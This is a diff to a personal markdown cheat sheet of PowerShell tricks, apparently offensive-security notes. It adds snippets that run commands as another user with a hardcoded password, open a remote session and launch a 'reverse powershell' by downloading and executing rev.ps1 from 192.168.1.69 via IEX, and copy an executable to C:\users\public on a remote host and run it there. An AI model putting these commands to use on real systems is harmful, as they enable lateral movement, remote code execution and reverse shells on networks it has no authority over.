@@ -1,6 +1,8 @@
 # powershell tricks
 
-## run powershell commands as another user with ps
+## run powershell commands as another user
+
+### with SecureString credential
 ```powershell
 $pass = ConvertTo-SecureString 'password123' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('.\user', $pass)
@@ -9,6 +11,19 @@ invoke-command -Computer ComputerHostname -Credential $cred -ScriptBlock { IEX(N
 ```
 change ComputerHostname.
 `-ConfigurationName ...` parameter might be required to run commands for special restricted user permissions
+
+### on remote machine with impersonated token
+```powershell
+$sess = New-PSSession -computer ComputerHostname
+# reverse powershell
+Invoke-Command -Session $sess -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://192.168.1.69/rev.ps1') }
+```
+
+#### copy and run file over session
+```powershell
+Copy-Item "c:\path\to\file.exe" -Destination "C:\users\public\" -ToSession $sess
+Invoke-Command -Session $sess -ScriptBlock { "C:\users\public\file.exe"  }
+```
 
 ## mount smb share as drive "letter"
 ```powershell
